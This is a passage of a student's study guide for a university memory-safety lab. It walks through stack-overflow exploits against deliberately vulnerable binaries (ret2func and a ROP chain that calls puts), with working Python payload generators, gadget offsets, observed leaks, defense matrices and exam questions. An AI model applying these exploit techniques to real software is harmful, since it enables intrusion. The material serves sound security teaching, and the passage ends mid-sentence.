- *Why `0x1254` and not `0x125e` (`call puts`)?* `puts` takes its argument in `rdi`;
  at `0x1254` the code loads the global `pwd` pointer into `rax`, then `rdi`. If you
  jumped straight to `call puts`, `rdi` would contain whatever the previous
  instruction left there (not reliably `pwd`).
- *What does `mov rax, [rip+0x2db5]` do?* RIP-relative load: it computes the address
  of the global `pwd` variable (`0x4010`) and loads the 8-byte pointer stored there
  (the address of the string `"pwd0"` in `.rodata`). `puts` then prints that string.
- *Why does the program print `pwd0` twice?* It does not; the first `printf` and the
  `puts` are separate. In this run only `puts` prints `pwd0`; the string
  `"your password is: "` was skipped because we jumped to `0x1254`.
- *Why a bus error instead of a segfault?* The corrupted `leave`/`ret` leads to an
  invalid/misaligned stack access; the kernel reports SIGBUS. The exact signal is
  not important; the leak already happened.
- *Could you use `printf` instead of `puts`?* Yes, but then you must set up `rdi`
  (format) and `rsi` (pwd), and `eax = 0` for varargs; `puts` needs only `rdi`, so it
  is simpler. This is exactly the README's hint.

---


### 5.6 Task 6 — ret2func chain: email then password

**Goal (README):** forge a file that makes the application leak **both** the password
and the email. Solution file: `task6/solution6.py`.

**Source (`task6/main.c`):**

```c
char * pwd = "pwd0";
char * email = "xx@yy.zz";

void printPwd(void) {
  printf("authorized\n your password is: ");
  puts(pwd);
}
void printEmail(void) {
  printf("\n your email is: ");
  puts(email);
}

int process(char * fname) {
  int length;
  char content[12];
  f = fopen(fname, "r");
  fscanf(f, "%d\n", &length);       // attacker controls length
  fread(content, length, 1, f);     // <-- writes `length` bytes into content[12]
  printf("%s\n", content);
  fclose(f);
  return 0;
}

int main(...) {
  char name[128];
  fprintf(stderr, "%p\n", main);    // leak (PIE base)
  printf("filename? \n");
  gets(name);
  process(name);
  ...
}
```

**File format:** first line = number of bytes, second part = that many raw bytes.
`fscanf("%d\n", &length)` consumes the decimal and the newline; `fread` then reads
exactly `length` bytes. Because it is a file, **NUL bytes are allowed** (unlike
`gets`/`strcpy`); this is why the payload can contain raw 8-byte addresses.

**Measured layout in `process`:**

| Object | Address | Size |
|---|---|---|
| `content` | `rbp-0x10` (`...e010`) | 12 |
| `length` | `rbp-0x4` (`...e01c`) | 4 |
| saved `rbp` | `[rbp]` (`...e020`) | 8 |
| saved `rip` | `[rbp+8]` (`...e028`) | 8 |

Distance `content` → saved `rip` = **24 bytes** (12 content + 4 length + 8 saved
`rbp`). The first 12 bytes fill `content`; bytes 12–15 overwrite `length` (already
used by `fread`, so harmless); bytes 16–23 overwrite saved `rbp`; bytes 24–31
overwrite the saved `rip`.

**Function offsets:**

```text
main        = 0x1317
printPwd    = 0x1229     -> main - 238  (-0xee)
printEmail  = 0x1257     -> main - 192  (-0xc0)
process     = 0x1285
```

`printEmail` and `printPwd` are before `main` in `.text`, hence negative offsets.
They are ordinary functions that print the globals `email` and `pwd` unconditionally.

**Solution (`task6/solution6.py`):**

```python
pmain = int(sys.stdin.readline(), 16)
p_printEmail = pmain + (-192)
p_printPwd   = pmain + (-238)
offset_content_to_rip = 24

rop_chain = (b"A" * 24 +
             p_printEmail.to_bytes(8, 'little') +
             p_printPwd.to_bytes(8, 'little'))

with open("payload.txt", "wb") as f:
    writeStr(f, f"{len(rop_chain)}\n")   # "40\n"
    writeBytes(f, rop_chain)             # 24 A + 8 + 8

print("payload.txt")                     # filename for main's gets()
```

**Payload diagram (40 bytes):**

```
offset 0..23    24 x 'A'                 fills content[12] + length[4] + saved rbp[8]
offset 24..31   address of printEmail     first return target
offset 32..39   address of printPwd       second return target
```

**How the chain executes:**

1. `process` returns; `ret` pops `p_printEmail` into `rip`.
2. `printEmail` runs: `printf("\n your email is: "); puts(email);`.
3. `printEmail`'s epilogue does `pop rbp; ret`. Be precise about the stack:
   after `process`'s `ret`, `rsp` points at `p_printPwd` (`R+8`). `printEmail`'s
   prologue `push rbp` writes the caller's `rbp` at `R` (the `p_printEmail` slot,
   which was already consumed); the epilogue `pop rbp` restores it, and the final
   `ret` pops `[R+8]`, which is `p_printPwd`. So the `pop rbp` does not consume
   `p_printPwd`; it consumes the slot pushed by `printEmail`'s own prologue.
4. `printPwd` runs: `printf("authorized\n your password is: "); puts(pwd);`.
5. It returns into whatever follows the chain (main's stack), so the process
   crashes after printing both secrets.

The key is that each function's own `ret` consumes the next 8 bytes of the chain;
you do not need gadgets, just a sequence of function addresses.

**Observed result:**

```text
$ unbuffer make attack
filename?
pmain        = 0x5acfc004d317
p_printEmail = 0x5acfc004d257
p_printPwd   = 0x5acfc004d229
AAAAAAAAAAAAAAAAAAAAAAAA...
 your email is: xx@yy.zz
authorized
 your password is: pwd0
Segmentation fault (core dumped)
```

`test.py` checks both `b"pwd0"` and `b"xx@yy.zz"`, so the test passes despite the
final crash.

---


**Why it works:**

- `fread` uses the attacker-controlled `length` without checking it against
  `sizeof(content)`; 40 bytes overflow the 12-byte buffer and reach `rip`.
- The file channel is binary-safe: the addresses contain NUL bytes and are still
  read correctly.
- `printEmail` and `printPwd` are existing functions that print the secrets
  unconditionally; no authentication check is involved.
- The two return addresses are laid out consecutively on the stack, so the first
  function's `ret` naturally returns to the second.
- ASLR is defeated by the leaked `main`; both offsets are constant within the PIE.

**Defenses that would help:** bound `length` (`if (length > sizeof(content))
length = sizeof(content)`), use `fgets`/`fread` with the buffer size, stack canary
(the write crosses it), ASLR without the leak, CFI/shadow stack. NX does **not**
stop ret2func; there is no injected code, only existing functions.

**Likely TA questions:**

- *Why use `fread` instead of `gets`?* The task gives a file; `fread` with an
  attacker-controlled length is the vulnerable primitive, and it preserves NUL
  bytes, so the payload can contain raw addresses.
- *Why is the offset 24 and not 12?* `content[12]` + `length` (4) + saved `rbp` (8)
  = 24; the saved `rip` follows at 24.
- *Does overwriting `length` matter?* No: `fread` has already used it; after that it
  is not read again in a way that affects the exploit.
- *Why does `printEmail` return to `printPwd`?* Because the 8 bytes immediately after
  the `printEmail` address in the payload are the `printPwd` address, and
  `printEmail`'s epilogue `ret` pops them.
- *Why not jump to `puts` directly?* `puts` needs `rdi` = string; the function
  `printEmail`/`printPwd` already set up their own `rdi` via their compiled code.
- *Why does the chain not need a `pop rdi` gadget?* Because we reuse whole functions
  that prepare their arguments internally; that is the difference between ret2func
  and full ROP.
- *Why does the process crash after printing?* The chain ends and the next `ret`
  reads whatever is above the payload (main's locals), which is not a valid address.
- *Does stack alignment matter?* In this build the chain is not ABI-perfectly aligned
  at the entry of the reused functions, but `printf`/`puts` tolerate it. If a chain
  crashes inside libc, add or remove a `ret` gadget to shift `rsp` by 8. This is a
  good "I verified it" detail.

---


### 5.7 Task 7 — full ROP chain in a static binary

**Goal (README):** forge a file that makes the application leak the password.
Solution file: `task7/solution7.py`. Unlike task 6, there is **no function that
prints the password**, and the binary is NX-protected, so you must use ROP: set
`rdi` to the address of the string `"pwd0"` and call `puts`.

**Source (`task7/main.c`):**

```c
char * pwd = "pwd0";
FILE * f;

int process(char * fname) {
  int length;
  char content[12];
  f = fopen(fname, "r");
  fscanf(f, "%d\n", &length);
  fread(content, length, 1, f);     // <-- same overflow as task 6
  printf("%s\n", content);
  fclose(f);
  return 0;
}

int main(...) {
  char name[128];
  fprintf(stderr, "%p\n", main);    // leak (redundant: non-PIE)
  printf("filename? \n");
  gets(name);
  process(name);
  ...
}
```

**Binary facts:**

```text
task7/main.elf: ELF 64-bit LSB executable, x86-64, statically linked
readelf -h: Type: EXEC              -> non-PIE, fixed code addresses
GNU_STACK: RW                       -> NX enabled (stack not executable)
```

Because it is static, libc is linked into the executable; `.text` is large and
contains many gadgets. The relevant symbols:

```text
main         0x401a47
puts         0x413c40
pwd object   0x4ca0d0   (an 8-byte pointer variable in .data)
"pwd0"       0x49e02c   (the value stored in pwd, in .rodata)
gadget       0x4334b8   (inside _dl_debug_vdprintf)
```

Verify:

```bash
readelf -s task7/main.elf | grep -E ' (pwd|main|puts)$'
objdump -s -j .rodata task7/main.elf | grep pwd0
objdump -d -M intel task7/main.elf --start-address=0x4334b0 --stop-address=0x4334c0
```

**Measured frame in `process`:** identical to task 6:

| Object | Address | Size |
|---|---|---|
| `content` | `rbp-0x10` (`...e020`) | 12 |
| `length` | `rbp-0x4` (`...e02c`) | 4 |
| saved `rbp` | `[rbp]` (`...e030`) | 8 |
| saved `rip` | `[rbp+8]` (`...e038`) | 8 |

Offset `content` → saved `rip` = **24**.

**Offsets from `main` (all positive because the targets are after `main` in the
static image):**

```text
gadget      0x4334b8 - 0x401a47 = 203377   (0x31a71)
ret         0x4334ba - 0x401a47 = 203379   (0x31a73)
puts        0x413c40 - 0x401a47 =  74233   (0x121f9)
"pwd0"      0x49e02c - 0x401a47 = 640485   (0x9c5e5)
```

**Solution (`task7/solution7.py`):**

```python
pmain = int(sys.stdin.readline(), 16)
offset_gadget     = 203377
offset_ret        = 203379
offset_puts       = 74233
offset_pwd_string = 640485
offset_content_to_rip = 24

p_gadget     = pmain + offset_gadget
p_ret        = pmain + offset_ret
p_puts       = pmain + offset_puts
p_pwd_string = pmain + offset_pwd_string

rop_chain = (
    b"A" * 24 +
    p_gadget.to_bytes(8, 'little') +
    p_pwd_string.to_bytes(8, 'little') +
    b"\x00" * 8 +
    p_ret.to_bytes(8, 'little') +
    p_puts.to_bytes(8, 'little')
)

with open("payload.txt", "wb") as f:
    writeStr(f, f"{len(rop_chain)}\n")   # "64\n"
    writeBytes(f, rop_chain)

print("payload.txt")
```

**Chain layout (64 bytes):**

```
offset 0..23    24 x 'A'                  fills content + length + saved rbp
offset 24..31   p_gadget                  0x4334b8: pop rdi; pop rbp; ret
offset 32..39   p_pwd_string              -> rdi = 0x49e02c ("pwd0")
offset 40..47   0x00 * 8                  dummy consumed by pop rbp
offset 48..55   p_ret                     0x4334ba: ret (one-slot adjustment)
offset 56..63   p_puts                    0x413c40: puts(rdi)
```

**Execution step by step:**

1. `process` returns; `rip = p_gadget`, `rsp` points to `p_pwd_string`.
2. `pop rdi` loads `p_pwd_string` into `rdi`.
3. `pop rbp` consumes the dummy 8 bytes.
4. `ret` jumps to `p_ret` (the bare `ret` gadget).
5. The bare `ret` pops `p_puts` into `rip`.
6. `puts` is entered with `rdi` pointing at `"pwd0"`; it prints `pwd0`.
7. `puts` returns into whatever follows the chain; the process crashes after the
   leak.

**The critical detail: `pwd` is a pointer, not the string.** The global object at
`0x4ca0d0` contains the **value** `0x49e02c` (the address of `"pwd0"`). `puts` wants
the address of the characters, so the chain must use `0x49e02c`, not `0x4ca0d0`.
Using `&pwd` would make `puts` print the 8 bytes of the pointer object as if they
were a string, which is not the password. This is a classic TA question.

**About the extra `ret` gadget:** the author's comment says "stack alignment fix".
On the x86-64 System V ABI a callee normally starts with `rsp % 16 == 8`; after
`process`'s `ret` the chain layout is such that the bare `ret` shifts `rsp` by 8.
In this build, GDB shows that with the extra `ret`, `puts` is entered with
`rsp % 16 == 0`; without it, with `rsp % 16 == 8`. Both variants actually print
`pwd0` on this glibc (I tested both). So the extra `ret` is a **conservative
one-slot adjustment**, not a strict requirement for this particular `puts`. If the
TA asks: "It is an alignment/padding slot; alignment-sensitive libc code can fault
if `rsp` is wrong, so ROP chains often include a bare `ret` to shift the stack by
8. In this build it is harmless and the test passes; I verified the exact `rsp`
value in GDB." Do not claim it is mandatory.

**Observed result:**

```text
$ unbuffer make attack
filename?
pmain        = 0x401a47
p_gadget     = 0x4334b8
p_puts       = 0x413c40
p_pwd_string = 0x49e02c
AAAAAAAAAAAAAAAAAAAAAAAA...
pwd0
Segmentation fault (core dumped)
```

**Why it works:**

- The `fread` overflow reaches the saved `rip` at offset 24.
- The gadget sets `rdi` to the address of the string `"pwd0"`.
- `puts` is an existing function; NX does not prevent calling it.
- The binary is static non-PIE, so all code and string addresses are fixed; ASLR
  only randomizes the stack (which we do not need). The leak is redundant but used
  by the template.
- The chain is a sequence of 8-byte addresses; the CPU's `ret` instructions walk it.

**Defenses that would help:** bound `length`; stack canary (the overflow crosses
it); CFI/shadow stack (the return target is not a valid return address); load the
binary as PIE (ASLR would then randomize the gadget/`puts` addresses, requiring a
leak — note the program already prints `main`, so a leak is available); remove the
DEBUG leak. NX **does not** stop ROP; that is the point. W^X is why task 7 cannot use
the task 4 shellcode approach.

**Likely TA questions:**

- *Why is task 7 static?* Static linking puts libc's code into the executable, so
  there are many gadgets, and it makes the binary non-PIE (`EXEC`), so gadget
  addresses are fixed. This isolates ROP mechanics from PIE randomization.
- *Why does the script still read the leaked `main`?* The template requires it; the
  value is always `0x401a47`, so it could be hard-coded. The leak demonstrates that
  the same script pattern works for PIE and non-PIE.
- *Why `pop rdi; pop rbp; ret` and not just `pop rdi; ret`?* That is the gadget that
  exists at `0x4334b8`; the `pop rbp` is harmless, but it consumes one extra stack
  slot, hence the dummy `0x00 * 8`.
- *Why the dummy 8 bytes?* `pop rbp` pops whatever is next; without the dummy, the
  chain would shift and `ret` would jump to the wrong address.
- *Why `puts` and not `printf`?* `puts` takes one argument in `rdi` and needs no
  varargs setup (`eax = 0`, format string, etc.). `printf` is possible but more
  complicated.
- *Why the address of the string `0x49e02c` and not the address of `pwd`
  `0x4ca0d0`?* `pwd` is a pointer variable; `0x4ca0d0` contains the pointer value
  `0x49e02c`. `puts` needs the string address.
- *How did you find the gadget?* `r2 -q -c '/R pop rdi' main.elf` (or ROPgadget),
  then disassembled at `0x4334b8`; the gadget starts in the middle of `pop r15`.
- *How do you know the offsets are right?* GDB with `p/x &main`, `p/x &puts`,
  `p (long)pwd-(long)main`, and `objdump` for the gadget; all offsets are constant
  because the binary is non-PIE.
- *What would change if the binary were PIE?* All offsets would still be constant,
  but the runtime base would be random; the leaked `main` would provide it, exactly
  as in tasks 3/5/6.
- *Would a stack canary stop it?* Yes, the 24-byte padding crosses the canary before
  reaching `rip`; the check would abort. The lab compiles with
  `-fno-stack-protector`.
- *Would NX stop it?* No. The chain only uses existing executable code; no shellcode
  is executed. NX stops task 4, not ROP.

---


### 5.8 The `tutorial/` program

`tutorial/` is not graded; it exists to practise GDB and to see the stack frame
layout described in the lab README.

**Source (`tutorial/main.c`):**

```c
char global_var[16];

void afunction(char * username) {
  char local_var[16];
  strcpy(local_var, username);   // overflow if argv[1] > 15 chars
  scanf("%s", global_var);        // overflow if stdin > 15 chars (no width limit)
  printf("User %s has password %s\n", local_var, global_var);
}

int main(int argc, char** argv) {
  if (argc < 2) { ... }
  afunction(argv[1]);
  return 0;
}
```

**What it does:** takes a username from `argv[1]` and a password from stdin, copies
the username into a 16-byte local buffer and reads the password into a 16-byte
global buffer, then prints both. Both copies are unbounded:
`strcpy` into `local_var[16]` and `scanf("%s")` into `global_var[16]`.

**Frame layout (from the README's GDB session):**

```text
afunction frame:
  rbp+8           saved rip      -> main+63 (0x...5288)
  rbp+0           saved rbp      -> main's rbp (0x...de50)
  rbp-0x10        local_var[16]  (0x...de10)
  rbp-0x18        username       (0x...de08)
  frame ends at  0x...de40
```

The README's `info frame` shows `rbp at 0x7fffffffde30, rip at 0x7fffffffde38`,
and `x/a 0x7fffffffde38` gives `0x555555555288 <main+63>`, the instruction after
the call. That is the saved return address an overflow would target. The distance
from `local_var` to saved `rip` is 16 (buffer) + 8 (saved rbp) = 24 bytes.

**GDB exercises from the README:**

```gdb
b main.c:11            # just before strcpy(local_var, username)
run roberto
p &local_var           # address of the buffer
p &username            # address of the parameter (in the caller's frame)
info frame             # saved rbp / rip
x/a $rbp               # saved rbp
x/a $rbp+8             # saved rip
info line *0x555555555288
disassemble main
```

The disassembly shows the prologue `push rbp; mov rbp,rsp; sub rsp,0x10`, the
`lea rax,[rbp-0x10]` for `local_var`, the `call strcpy`, and the epilogue
`leave; ret`. The README also explains `lea 0xdbf(%rip),%rdi` and `puts@plt`:
RIP-relative addressing plus the PLT (Procedure Linkage Table) for a dynamically
linked libc function.

Use this program to demonstrate that you can read a frame without the solution
scripts: break, print `&local_var`, `info frame`, subtract, and explain what would
happen with a 24-byte username.

---

## 6. Cross-task comparison

| Property | Task 1 | Task 2 | Task 3 | Task 4 | Task 5 | Task 6 | Task 7 |
|---|---|---|---|---|---|---|---|
| Vulnerability | over-read | overflow | overflow | overflow | overflow | overflow | overflow |
| Bad API | `write` | `strcpy` | `strcpy`/`gets` | `gets` | `strcpy`/`gets` | `fread` | `fread` |
| Corrupted object | `pwd` read | `pwd` write | saved `rip` | saved `rip` | saved `rip` | saved `rip` | saved `rip` |
| Offset to control | — | — | 20 | 168 | 20 | 24 | 24 |
| Target | — | — | `print_my_pwd` | stack shellcode | `check_user+0x6b` | `printEmail`→`printPwd` | `pop rdi;...`→`puts` |
| Class | over-read | data-only | ret2text | code injection | ret2code | ret2func | ROP |
| Leak used | none | none | `main` | `&mail_subject` | `main` | `main` | `main` (redundant) |
| PIE? | yes | yes | yes | yes | yes | yes | **no** (static) |
| NX? | yes | yes | yes | **no** (execstack) | yes | yes | yes |
| Canary? | no | no | no | no | no | no | no |
| Input channel | argv | argv | stdin (`gets`) | stdin (`gets`) | stdin (`gets`) | file (`fread`) | file (`fread`) |
| Binary-safe? | argv (no NUL) | argv | `gets` (NUL later truncated by `strcpy`) | `gets` (no NUL in payload) | same as task 3 | yes | yes |
| Expected crash | no | no | yes | yes (exit 1) | yes (SIGBUS) | yes | yes |
| Test checks | `pwd0` | no "non authorized" | `your pwd is: pwd0` | `root:` | `pwd0` | `pwd0` + `xx@yy.zz` | `pwd0` |

**The progression in one sentence per task:**

1. Read too much → leak a secret.
2. Write too much into a neighbouring variable → bypass a check.
3. Write too much into a return address → jump to an existing function.
4. Write too much and jump to injected code → execute arbitrary code.
5. Jump into the middle of an existing function → skip the check and reuse its
   `puts`.
6. Chain two existing functions → leak two secrets.
7. Chain instruction gadgets → call `puts` with a controlled argument under NX.

---


## 7. Defense matrix for this lab

Legend: **stops** = the defense would prevent this specific exploit as written;
**no** = it does not; **partial** = it only helps under extra conditions.

| Defense | T1 | T2 | T3 | T4 | T5 | T6 | T7 |
|---|---|---|---|---|---|---|---|
| Bounds check / safe input | stops | stops | stops | stops | stops | stops | stops |
| Stack canary | no (read) | **no** (data-only, below canary) | stops | stops | stops | stops | stops |
| NX / W^X | no | no | **no** (ret2text) | **stops** | no (ret2code) | no (ret2func) | **no** (ROP) |
| ASLR without leak | no | no | stops | stops | stops | stops | no (non-PIE) |
| ASLR with the lab's leak | no | no | no | no | no | no | no |
| PIE (if task 7 were PIE) | no | no | no | no | no | no | **partial** (needs leak; program leaks) |
| CFI / shadow stack | no | no | stops | stops | stops | stops | stops |
| RELRO | no | no | no | no | no | no | no |
| Guard pages | partial | no | no | no | no | no | no |
| Memory-safe language | stops | stops | stops | stops | stops | stops | stops |

Key observations for the viva:

- **Task 1 and task 2 are immune to canary, NX and ASLR** because they do not
  corrupt control metadata and do not need addresses. Only input validation /
  bounds checking (or a memory-safe language) stops them.
- **Task 4 is the only one stopped by NX**, because it is the only one that executes
  injected code. This is the cleanest demonstration of W^X.
- **Tasks 3, 5, 6, 7 are stopped by a canary** (they cross it), but the lab disables
  it with `-fno-stack-protector`.
- **Tasks 3–7 are stopped by ASLR only if the leak is removed.** The DEBUG output is
  a deliberate information disclosure; the lecture's point is that ASLR's assumption
  "no useful address disclosure" is often violated.
- **Task 7 is not protected by ASLR for code** because the binary is non-PIE/static;
  the stack is randomized but the exploit does not need a stack address.
- **CFI/shadow stack** would stop all return-address hijacks (tasks 3–7), because the
  overwritten return address is not a valid return site. It would not stop task 1/2
  (over-read/data corruption).

---


## 8. Viva / exam question bank with answers

### 8.1 The official Lecture 14 memory-safety question

The exam-recap slide gives this program (*Lecture14pdf*, slides 25–26):

```c
void do_damage() { ... }

typedef struct dog {
  int age;
  char *name;
  char *race;
} Dog;

typedef struct cat {
  int age;
} Cat;

void do_something(Dog * input) {
  Cat tmp;
  memcpy(&tmp, input, sizeof(Dog));
  return;
}
```

**Q1. Explain the bug and provide an input that causes `do_damage` to execute.**

The bug is a **type confusion / wrong-size copy**: `tmp` is a `Cat` (4 bytes), but
`memcpy` copies `sizeof(Dog)` bytes into it. On x86-64, `Dog` is 24 bytes: `int age`
(4) + 4 padding + `char *name` (8) + `char *race` (8). `Cat` is 4 bytes. The copy
overflows `tmp` and overwrites the saved frame pointer with `input.name` and the
saved return address with `input.race` (assuming the typical layout `tmp` at
`rbp-4`, then padding, saved `rbp` at `[rbp]`, saved `rip` at `[rbp+8]`). Set
`input.race = (char *)do_damage`; when `do_something` returns, `ret` jumps to
`do_damage`. (`input.age` fills `tmp` and padding.)

**Q2. Propose a solution to fix the procedure.**

Do not allocate a `Cat` if the data is a `Dog`; make the types match. If a partial
copy is intended, copy only `sizeof(tmp)` bytes and validate the source type/size;
use a type-safe API (e.g. assign the field you need) rather than a raw `memcpy`.
Compiler warnings/static analysis and a bounds-checked copy help. More generally:
do not use `memcpy` with a size derived from a different type.

**Q3. Would pointer encryption counter an attack that attempts to execute
`do_damage`?**

No. There is no function pointer here; the return address is written by `call` and
read by `ret`. Pointer encryption would help only if the return address (RIP) in the
stack frame were encrypted/authenticated, which this code does not do. The official
answer says "no, there is no function pointer here; the return address is set when
calling the function."

**Q4. Would executable address space protection counter the attack?**

It depends on what `race` points to. NX/W^X **does not** stop a return to an existing
function such as `do_damage`: that code is already in an executable page. It **does**
stop the variant where `race` points to attacker-controlled shellcode on the stack
or heap, because those pages are non-executable. The official answer emphasizes the
code-injection variant ("if race points to a string controlled by the attacker, that
string will be executed" — and NX prevents that). State both cases; do not say NX
stops all control-flow hijacks.

**Q5. Would a stack canary counter the attack?**

Yes, provided a canary is placed between `tmp` and the saved `rbp`/`rip` (the normal
`-fstack-protector` layout). The `memcpy` would overwrite the canary on its way to
the return address; the epilogue check would detect the change and call
`__stack_chk_fail`. The official answer: "Yes, we would detect that the buffer has
been overflowed when we execute return, since the random bits (canary) between the
local variables and the RIP have been modified."

**Q6. Would ASLR counter the attack?**

Yes, if the address of `do_damage` is randomized (PIE) and not disclosed; the
attacker cannot reliably write it into `race`. It does **not** work against code
injection (the attacker can put code on the stack/heap, though its address is also
randomized), and it is defeated by any address leak or by a non-PIE binary. The
official answer: "Yes, by randomizing the base address of code (assuming this is not
leaked) we make it difficult for the attacker to guess the address of do_damage,
which must be saved in the RIP (but does not work against the case of code
injection)."

---


### 8.2 C and memory basics

**Q: What is memory safety?**
Every access stays within a live object of the right type, with the language's
permissions. C/C++ are not memory safe: pointers, arrays and manual allocation have
no automatic bounds/lifetime checks.

**Q: Spatial vs temporal safety?**
Spatial: an access is outside the object's bounds (buffer overflow/over-read).
Temporal: an access uses an object after its lifetime (use-after-free, dangling
pointer, double free). This lab is spatial; the lecture also covers dangling
pointers, double free, leaks, uninitialized memory.

**Q: Where do locals, globals and heap objects live?**
Locals on the stack (automatic storage); globals/static in `.data`/`.bss`; dynamic
allocation on the heap; code in `.text`; literals in `.rodata`.

**Q: Why do C strings need a NUL terminator?**
The length is not stored; every string function scans until `'\0'`. Without a NUL,
`strlen`/`printf("%s")`/`strcpy` read past the buffer until they happen to find a
zero (over-read), and `strcpy` may write far past the destination.

**Q: `strcpy` vs `strncpy` vs `snprintf`?**
`strcpy` copies until NUL with no bound. `strncpy(dst, src, n)` copies at most `n`
bytes but does **not** guarantee a terminating NUL if `src` is at least `n` long.
`snprintf(dst, n, "%s", src)` always terminates (if `n > 0`) and returns the length
that would have been written, which can be used to detect truncation. `strlcpy` is
not in glibc.

**Q: Why is `gets` dangerous and why is it declared manually here?**
`gets` has no size argument, so it cannot be used safely; it was removed from C11
and from modern glibc headers. The lab source declares `char *gets(char *)` itself so
it still compiles/links against the compatibility symbol. Use `fgets(buf, size,
stdin)`; it keeps the newline if it fits and always NUL-terminates.

**Q: `printf("%s", p)` vs `write(1, p, n)`?**
`printf` stops at the first NUL and formats; `write` writes exactly `n` raw bytes,
including NULs and binary data. Task 1 relies on `write`'s behaviour to leak `pwd`
past the NUL after `hello`.

**Q: Pointer vs array?**
An array name decays to a pointer to its first element, but the array object has a
size; a pointer is just an address. `char pwd[8]` is 8 bytes of storage; `char *pwd`
is an 8-byte pointer variable that can point anywhere. Task 1/2 use arrays; tasks
3–7 use a global `char *pwd` pointing to a string literal.

**Q: What is undefined behaviour and why does it matter?**
C says the program has no defined meaning for out-of-bounds access, signed overflow,
use-after-free, etc. The compiler may assume it never happens and optimize
accordingly; at `-O0` the code is usually "what you wrote", at `-O2` an overflow may
be optimized away or behave differently. This is why the lab uses `-O0` and why
exploits are compiler/layout dependent.

**Q: Why little-endian?**
x86-64 stores the least significant byte at the lowest address. An 8-byte address
must be written LSB first; `to_bytes(8, 'little')` does that.

**Q: What is the difference between `atoi` and `strtol`?**
`atoi` has no error reporting and undefined behaviour on overflow; `strtol` sets
`errno` and an end pointer. The lab's `n = atoi(argv[2])` trusts the input; a
negative value becomes a huge `size_t` in `write`, which can fault.

---


### 8.3 Stack, ABI and control flow

**Q: What does `call` do? What does `ret` do?**
`call target`: `rsp -= 8; [rsp] = address of next instruction; rip = target`.
`ret`: `rip = [rsp]; rsp += 8`. The saved return address is the link back to the
caller; overwriting it hijacks control.

**Q: What is `leave`?**
`leave` = `mov rsp, rbp; pop rbp`. It destroys the current frame and restores the
caller's frame pointer; the following `ret` returns. A corrupted saved `rbp` makes
`leave` restore garbage, which usually crashes later.

**Q: Why is the saved `rip` at `[rbp+8]`?**
The prologue pushes the caller's `rbp` at `[rbp]`; the `call` that entered the
function pushed the return address immediately above it, at `[rbp+8]`. Locals are at
negative offsets.

**Q: How do you find the offset from a buffer to the return address?**
`p &buffer`, `info frame` (saved `rip` address), subtract; or read the `lea
rax,[rbp-0xNN]` and add 8 for the saved `rbp` plus any intervening locals; or use a
cyclic pattern and read `rip` after the crash.

**Q: Why does the compiler add padding between locals?**
Alignment: 8-byte pointers and 16-byte stack alignment; it may also place variables
in a different order than declared. Never assume source order; measure.

**Q: What is the System V AMD64 calling convention?**
Integer args in `rdi, rsi, rdx, rcx, r8, r9`; return in `rax`; `rbp, rbx, r12–r15`
callee-saved; `rsp` 16-byte aligned at the call site (so `rsp % 16 == 8` at callee
entry).

**Q: Why does stack alignment matter for ROP?**
libc may use SSE instructions (`movaps`) that fault on misaligned addresses. If a
chain crashes inside a libc function, add/remove a `ret` gadget to shift `rsp` by 8.
In task 7 the extra `ret` is a one-slot adjustment; both with/without worked on this
glibc, so don't overclaim.

**Q: What is `endbr64`?**
A CET (Control-flow Enforcement Technology) landing-pad instruction at indirect
branch targets. It behaves like a NOP on CPUs without CET and does not stop a `ret`
hijack (CET's shadow stack/IBT would, if enabled). It appears at the start of the
functions in the disassembly.

**Q: Why `-O0`?**
It keeps the source-level stack layout (no register allocation of locals), makes
GDB/source breakpoints reliable, and avoids optimizer transformations. Security
lessons are easier to see, but real exploits must handle optimized code.

**Q: Where is the canary in the frame?**
Between the local buffers and the saved `rbp`/`rip`; the prologue writes it and the
epilogue compares it. An overflow from a local buffer crosses it before reaching
`rip`.

**Q: Does GDB disable ASLR?**
Yes, by default GDB disables randomization for reproducibility. Use
`set disable-randomization off` to observe real ASLR; offsets are unaffected.

---


### 8.4 Exploitation mechanics

**Q: Difference between buffer overflow and buffer over-read?**
Overflow writes outside the object (integrity/control); over-read reads outside it
(confidentiality). Task 1 is over-read; tasks 2–7 overflow. Heartbleed is the
famous over-read.

**Q: How does leaking `main` defeat ASLR?**
`main`'s runtime address is `base + static_main`. Every other symbol in the same
image is `base + static_symbol`, and the difference `static_symbol - static_main`
is fixed. So `runtime_target = leaked_main + (static_target - static_main)`; the
random base cancels. This is why the scripts only need one code pointer.

**Q: What if the program did not leak an address?**
For PIE + ASLR you would have to guess the base (impractical on 64-bit, maybe
brute-force with many tries/partial overwrite), find another leak (format string,
over-read, side channel), or use a relative overwrite that only changes low bytes.
On 32-bit, ASLR entropy is much lower and brute force is more feasible.

**Q: ret2text vs ret2code vs ret2func vs ROP?**
ret2text jumps to the start of an existing function (task 3). ret2code/partial reuse
jumps inside a function to reuse an instruction sequence (task 5). ret2func chains
whole functions whose own `ret` continues the chain (task 6). ROP chains small
gadgets ending in `ret`, giving fine-grained control (task 7).

**Q: What are the requirements for code injection?**
A writable buffer that is also executable (or a way to call `mprotect`), a
position-independent payload, and a known address to jump to (leaked stack address).
Task 4 uses `-z execstack` and leaks `&mail_subject`.

**Q: Why must shellcode be position-independent?**
The attacker does not know where the buffer will be (ASLR) and cannot use absolute
addresses without a leak. `call`/`pop` gets the current address; RIP-relative
addressing is another option. The task 4 shellcode uses `jmp/call/pop` to obtain the
path pointer.

**Q: Why avoid NUL bytes in shellcode?**
If the payload travels through a C-string function (`strcpy`, `gets` + `strcpy`,
`printf("%s")`), a NUL terminates it. The task 4 shellcode avoids NULs and uses
`xor`/`add al` to build small constants, and `db "/etc/passwdA"` + `xor` to build
the terminator at runtime.

**Q: Why does NX not stop ROP?**
ROP does not execute injected code; it executes existing instructions in executable
pages (`.text`, libc). NX only makes data pages non-executable. ROP's defense is
CFI/shadow stack or code randomization, not NX.

**Q: What is a partial overwrite?**
Overwriting only the low bytes of a return address/pointer while leaving high bytes
unchanged. It can bypass ASLR if the target is in the same mapping and the low bytes
are predictable; it requires a write primitive that stops early (e.g. a NUL byte).
It is an ASLR limitation mentioned in the lecture ("relative overwrites").

**Q: Why are addresses 8 bytes?**
x86-64 pointers are 64-bit. `to_bytes(8, 'little')` produces 8 bytes. On a 32-bit
system they would be 4 bytes.

**Q: Why do the programs crash after leaking the password?**
The payload corrupts saved `rbp`/`rip` and the chain has no valid continuation after
the leak. The task only requires the leak; a clean exit would need a full chain
(e.g. call `exit`) or a repaired stack. The test accepts the crash.

**Q: Why does task 4 leak a stack address instead of `main`?**
Because it needs the address of the injected shellcode on the stack, not a code
address. `&mail_subject` is printed; the body is 128 bytes below it. Code addresses
